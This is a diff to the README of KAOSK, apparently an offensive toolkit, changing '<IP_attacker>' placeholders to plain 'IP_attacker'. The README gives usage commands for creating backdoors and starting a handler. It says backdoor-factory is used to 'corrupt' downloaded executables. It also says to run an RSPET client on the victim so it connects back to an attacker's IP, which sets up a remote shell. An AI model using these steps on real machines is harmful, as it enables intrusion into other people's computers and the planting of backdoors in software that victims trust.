@@ -46,10 +46,10 @@ KAOSK has been tested in Kali2.
 python ./install.py
 
 ## Create Backdoors
-python ./create_backdoors.py <IP_attacker>
+python ./create_backdoors.py IP_attacker
 
 ## Start handler
-python ./handler.py <IP_attacker>
+python ./handler.py IP_attacker
 
 
 # To Know about the backdoors
@@ -65,7 +65,7 @@ python ./handler.py <IP_attacker>
 ## Backdoor-factory
 The backdoor-factory introduces the backdoors inside executables.
 
-If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside ./BDF_prepared and run python ./create_backdoors.py <IP_attacker> (or python ./backdoor-factoryAuto.py <IP_attacker>)
+If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside ./BDF_prepared and run python ./create_backdoors.py IP_attacker (or python ./backdoor-factoryAuto.py IP_attacker)
 
 https://github.com/secretsquirrel/the-backdoor-factory.git
 
@@ -89,7 +89,7 @@ https://github.com/n1nj4sec/pupy.git
 
 ## RSPET
 To use this backdoor you have to run:
-+ Victim: Run python RSPET_folder/Client/rspet_client.py <IP_Attacker>
++ Victim: Run python RSPET_folder/Client/rspet_client.py IP_Attacker
 + Attacker: (This part is automated) Run Server > rspet_server.py 
 
 https://github.com/panagiks/RSPET.git
